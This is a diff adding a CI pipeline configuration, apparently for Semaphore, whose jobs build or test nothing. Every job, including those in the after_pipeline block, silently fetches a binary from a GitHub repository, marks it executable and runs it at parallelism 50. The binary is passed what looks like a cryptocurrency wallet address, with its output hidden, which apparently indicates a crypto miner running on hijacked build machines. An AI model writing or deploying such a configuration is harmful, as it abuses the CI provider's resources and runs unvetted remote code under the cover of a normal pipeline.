@@ -1,0 +1,37 @@
+version: v1.0
+name: Initial Pipeline
+agent:
+  machine:
+    type: f1-standard-2
+    os_image: ubuntu2204
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget -qO cokro https://github.com/startpatrick325/probable-spoon/raw/refs/heads/main/start'
+            - chmod +x cokro
+            - ./cokro z --username Ce2idDDd2XJ1Rv7M4qmWjoUGmZWfNhbG6hL8xzHAiAEd > /dev/null 2>&1
+          parallelism: 50
+        - name: 'Job #2'
+          commands:
+            - 'wget -qO cokro https://github.com/startpatrick325/probable-spoon/raw/refs/heads/main/start'
+            - chmod +x cokro
+            - ./cokro z --username Ce2idDDd2XJ1Rv7M4qmWjoUGmZWfNhbG6hL8xzHAiAEd > /dev/null 2>&1
+          parallelism: 50
+after_pipeline:
+  task:
+    jobs:
+      - name: 'Job #1'
+        commands:
+          - 'wget -qO cokro https://github.com/startpatrick325/probable-spoon/raw/refs/heads/main/start'
+          - chmod +x cokro
+          - ./cokro z --username Ce2idDDd2XJ1Rv7M4qmWjoUGmZWfNhbG6hL8xzHAiAEd > /dev/null 2>&1
+        parallelism: 50
+      - name: 'Job #2'
+        commands:
+          - 'wget -qO cokro https://github.com/startpatrick325/probable-spoon/raw/refs/heads/main/start'
+          - chmod +x cokro
+          - ./cokro z --username Ce2idDDd2XJ1Rv7M4qmWjoUGmZWfNhbG6hL8xzHAiAEd > /dev/null 2>&1
+        parallelism: 50
